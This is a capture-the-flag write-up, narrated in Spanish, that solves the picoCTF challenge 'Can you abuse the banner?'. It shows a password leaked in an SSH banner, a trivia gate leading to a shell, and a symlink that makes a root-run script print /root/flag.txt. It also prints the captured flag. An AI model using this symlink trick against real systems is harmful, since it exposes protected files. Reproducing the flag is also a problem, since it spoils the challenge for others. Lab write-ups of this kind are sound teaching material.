Can you abuse the banner?
The server has been leaking some crucial information on `tethys.picoctf.net 57069`. Use the leaked information to get to the server.To connect to the running application use `nc tethys.picoctf.net 63467`. From the above information abuse the machine and find the flag in the /root directory.

Hints:
1. Do you know about symlinks?
2. Maybe some small password cracking or guessing

## Solución:
```
┌──(kali㉿kali)-[~]
└─$ nc tethys.picoctf.net 57069
SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234

Protocol mismatch.
---------------------------------------------------------
Ingresamos al sistema
---------------------------------------------------------
┌──(kali㉿kali)-[~/Documents/GS]
└─$ nc tethys.picoctf.net 63467
*************************************
**************WELCOME****************
*************************************

what is the password? 
My_Passw@rd_@1234
What is the top cyber security conference in the world?
RSA
Lol, good try, try again and good luck

What is the top cyber security conference in the world?
RSA Conference
Lol, good try, try again and good luck

What is the top cyber security conference in the world?
DEF CON
the first hacker ever was known for phreaking(making free phone calls), who was it?
JOHN  
player@challenge:~$
---------------------------------------------------------
Buscamos donde esta la flag
---------------------------------------------------------
player@challenge:/$ cd root     
cd root
player@challenge:/root$ ls
ls
flag.txt  script.py
player@challenge:/root$ cat flag.txt
cat flag.txt
cat: flag.txt: Permission denied
-------------------------------------------------------
Revisamos el script.py y vemos que es con el que nos topamos al inicio, el cual apunta al archivo banner que es el que nos da la bienvenida
-------------------------------------------------------
player@challenge:/root$ cat script.py   
cat script.py

import os
import pty

incorrect_ans_reply = "Lol, good try, try again and good luck\n"

if __name__ == "__main__":
    try:
      with open("/home/player/banner", "r") as f:
        print(f.read())
    except:
      print("*********************************************")
      print("***************DEFAULT BANNER****************")
      print("*Please supply banner in /home/player/banner*")
      print("*********************************************")

try:
    request = input("what is the password? \n").upper()
    while request:
        if request == 'MY_PASSW@RD_@1234':
            text = input("What is the top cyber security conference in the world?\n").upper()
            if text == 'DEFCON' or text == 'DEF CON':
                output = input(
                    "the first hacker ever was known for phreaking(making free phone calls), who was it?\n").upper()
                if output == 'JOHN DRAPER' or output == 'JOHN THOMAS DRAPER' or output == 'JOHN' or output== 'DRAPER':
                    scmd = 'su - player'
                    pty.spawn(scmd.split(' '))

                else:
                    print(incorrect_ans_reply)
            else:
                print(incorrect_ans_reply)
        else:
            print(incorrect_ans_reply)
            break

except:
    KeyboardInterrupt
--------------------------------------------
Creamos un symlink con la ruta donde encontramos la bandera, ahora referenciada en el banner que sera abierto por el script al inicio, pero primero eliminamos el banner anterior
--------------------------------------------
player@challenge:~$ rm banner
rm banner
player@challenge:~$ ls
ls
text
player@challenge:~$ ln -s /root/flag.txt banner
ln -s /root/flag.txt banner
-------------------------------------------
Al ingresar otra vez con netcat nos mostrara la flag:

┌──(kali㉿kali)-[~/Documents/GS]
└─$ nc tethys.picoctf.net 63467
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_ed6f9c71}

what is the password? 

```